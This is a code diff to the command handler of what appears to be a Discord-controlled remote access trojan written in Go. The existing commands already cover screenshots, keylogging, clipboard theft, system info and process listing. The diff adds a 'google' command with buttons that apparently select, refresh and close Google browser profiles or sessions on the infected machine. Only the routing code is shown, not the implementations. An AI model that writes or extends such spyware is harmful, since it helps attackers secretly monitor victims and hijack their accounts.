@@ -55,6 +55,8 @@ func handleCommand(s *discordgo.Session, i *discordgo.InteractionCreate) {
 		commands.Screenshot(s, i)
 	case "keylog":
 		commands.Keylog(s, i)
+	case "google":
+		commands.Google(s, i)
 	case "sysinfo":
 		commands.SysInfo(s, i)
 	case "ps":
@@ -98,6 +100,16 @@ func handleComponent(s *discordgo.Session, i *discordgo.InteractionCreate) {
 		commands.ClipboardGet(s, i)
 	case customID == "btn_keylog_dump":
 		commands.KeylogDump(s, i)
+	case customID == "btn_google_close":
+		commands.GooglePanel(s, i)
+	case customID == "btn_google_refresh":
+		commands.GoogleRefresh(s, i)
+	case customID == "btn_google_all":
+		commands.GoogleCloseAll(s, i)
+	case customID == "sel_google_profile":
+		commands.GoogleSelect(s, i)
+	case strings.HasPrefix(customID, "btn_google_one_"):
+		commands.GoogleCloseOne(s, i)
 	case customID == "btn_keylog_start":
 		commands.KeylogStart(s, i)
 	case customID == "btn_keylog_stop":
